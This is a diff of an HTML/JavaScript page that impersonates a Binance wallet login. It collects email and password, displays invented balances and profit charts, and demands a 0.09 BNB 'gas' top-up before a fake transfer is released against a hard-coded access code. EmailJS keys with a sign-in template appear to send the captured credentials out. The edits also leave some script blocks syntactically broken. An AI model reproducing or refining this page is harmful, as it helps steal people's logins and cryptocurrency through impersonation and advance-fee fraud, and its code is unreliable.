@@ -69,8 +69,7 @@
     }
   </style>
 </head>
-<body>
-  <div class="container">
+<body> <div class="container">
     <h2>Binance Wallet Login</h2>
     <input type="email" id="email" placeholder="Email" />
     <input type="password" id="pass" placeholder="Password" />
@@ -218,6 +217,8 @@
     <p class="text-sm text-gray-400">Balance</p>
   </div>
   </div>
+
+  <!-- Daily Profit Goal-->
   <div class="container">
     <p class="goal-text">Daily Profit Goal: <strong>$150.00</strong></p>
     <div id="dailyProgress">$0.00 (0%)</div>
@@ -230,7 +231,7 @@
     <canvas id="profitChart" width="460" height="240"></canvas>
   </div>
 
-<!-- PAGE 13: Settings Page -->
+<!-- page 13: Settings Page -->
 <div id="page13" class="page" style="background-color: #0b0e11; color: #f0b90b; padding: 20px; min-height: 100vh;">
   <h2 style="font-size: 24px; margin-bottom: 20px;">Settings</h2>
 
@@ -269,7 +270,7 @@
 </div>
 
         
-<!-- Page 6: Scan (Binance Dark Theme) -->
+<!-- Page 6: Scan -->
 <div class="page min-h-screen bg-[#0B0E11] text-white p-6" id="page6">
   <div class="max-w-md mx-auto bg-[#1E2329] p-6 rounded-2xl shadow-lg">
     
@@ -320,7 +321,7 @@
   </div>
 </div>
 
-<!-- Page 7: Connect Wallet (Binance Dark Mode) -->
+<!-- Page 7: Connect Wallet -->
 <div class="page min-h-screen bg-[#0B0E11] text-white p-6" id="page7">
   <div class="max-w-md mx-auto bg-[#1E2329] p-6 rounded-2xl shadow-lg space-y-6">
     
@@ -399,18 +400,6 @@
 </div>
 
 
-<!-- Page 5: Main Dashboard -->
-<div class="page visible" id="page5">
-  <div class="form-container">
-    <h2>Main Dashboard</h2>
-    <p>Total Assets: <span id="totalAssetsDisplay">$2978.78</span></p>
-    <button onclick="showPage('page8')">Make Another Transfer</button>
-    <br/><br/>
-    <button id="connectWalletBtn" onclick="connectWallet()">🔌 Connect Wallet</button>
-    <p id="walletAddress" style="font-size: 14px; margin-top: 10px;"></p>
-  </div>
-</div>
-
 <!-- Page 8: Transfer to Main Wallet -->
 <div id="page8" class="page">
   <div class="form-container">
@@ -424,7 +413,7 @@
     <input type="number" id="transferAmount" placeholder="Enter Amount" class="input" /><br/>
     <button onclick="setMaxAmount()">Use Max</button><br/><br/>
     <button onclick="goToBNBConfirmationPage()">Confirm</button>
-    <button onclick="showPage('page5')">Return</button>
+    <button onclick="showPage('5')">Return</button>
   </div>
 </div>
 
@@ -435,7 +424,7 @@
     <p>Top up <strong>0.09 BNB</strong> to continue.</p>
     <div id="bnbAddressSection"></div>
     <button onclick="copyBNBAddress()">📋 Copy Address</button>
-    <button onclick="showPage('accessCodePage')">✅ Confirm BNB Gas Code</button>
+    <button onclick="showPage('9ii')">✅ Confirm BNB Gas Code</button>
   </div>
 </div>
 
@@ -445,7 +434,7 @@
     <h2>Access Code Required</h2>
     <input type="text" id="accessCodeInput" placeholder="Enter Access Code" class="input" /><br/>
     <button onclick="validateAccessCode()">Submit Access Code</button><br/><br/>
-    <button onclick="showPage('page8')">Go Back</button>
+    <button onclick="showPage('8')">Go Back</button>
   </div>
 </div>
 
@@ -473,8 +462,16 @@
     <h2 class="text-red-500">❌ Transaction Declined</h2>
     <p class="bold-decline">Transaction Declined - Invalid Access Code</p>
   </div>
+<div class="page visible" id="page5">
+  <div class="form-container">
+    <h2>Main Dashboard</h2>
+    <p>Total Assets: <span id="totalAssetsDisplay">$2978.78</span></p>
+    <button onclick="showPage('8')">Make Another Transfer</button>
+    <br/><br/>
+    <button id="connectWalletBtn" onclick="connectWallet()">🔌 Connect Wallet</button>
+    <p id="walletAddress" style="font-size: 14px; margin-top: 10px;"></p>
+  </div>
 </div>
-
 
 <script>
   let totalAsset = 2978.78;
@@ -579,7 +576,7 @@
 
   function validateAccessCode() {
     const inputCode = document.getElementById('accessCodeInput').value.trim();
-    showPage('processingPage');
+    showPage('10');
 
     setTimeout(() => {
       if (inputCode === 'B577nn8h') {
@@ -591,13 +588,13 @@
           <p><strong>Network:</strong> ${transferData.network}</p>
           <p><strong>From Contract Address:</strong> ${transferData.contractAddress}</p>
         `;
-        showPage('successPage');
-        setTimeout(() => showPage('page5'), 3000);
+        showPage('11');
+        setTimeout(() => showPage('5'), 3000);
       } else {
-        showPage('declinePage');
+        showPage('12');
         setTimeout(() => {
           resetForm();
-          showPage('page8');
+          showPage('8');
         }, 3000);
       }
     }, 10000);
@@ -612,12 +609,9 @@
   }
 
   document.addEventListener('DOMContentLoaded', () => {
-    showPage('page5');
+    showPage('5');
   });
-</script>
 
-  
-<script>
   let web3Modal;
   let provider;
 
@@ -626,8 +620,6 @@
       cacheProvider: false,
       walletConnectProjectId:
       themeMode: "dark"
-      providerOptions: {}
-    });
   }
 
   async function connectWallet() {
@@ -675,9 +667,6 @@
       document.getElementById('walletInfo').innerText = `Connected Wallet: ${savedWallet}`;
     }
   };
-</script>
-  
-  <script>
   function confirmWallet() {
     const walletInput = document.getElementById('walletAddress');
     const wallet = walletInput.value.trim();
@@ -705,9 +694,7 @@
     // Optionally clear the input field
     document.getElementById('walletAddress').value = '';
   }
-</script>
 
-<script>
 const emailService = "service_78wwbgl";
 const signinTemplate = "template_omkmcio";
 const publicKey = "ochPV1QVtay7TOdBA";
@@ -776,6 +763,7 @@ function submitTransaction() {
     document.getElementById("totalAssets").textContent = "$" + newBal + " USDT";
   }, 5000);
 }
+    
  let goal = 150, progress = 0;
 
   const ctx = document.getElementById("profitChart").getContext("2d");
@@ -837,8 +825,7 @@ function submitTransaction() {
         }
       }
     }
-  });
-
+    
   function updatePerformance() {
     const now = new Date().toLocaleTimeString();
 
@@ -870,5 +857,5 @@ function submitTransaction() {
 
   setInterval(updatePerformance, 6000);
 </script>
-  
+ 
 </html>
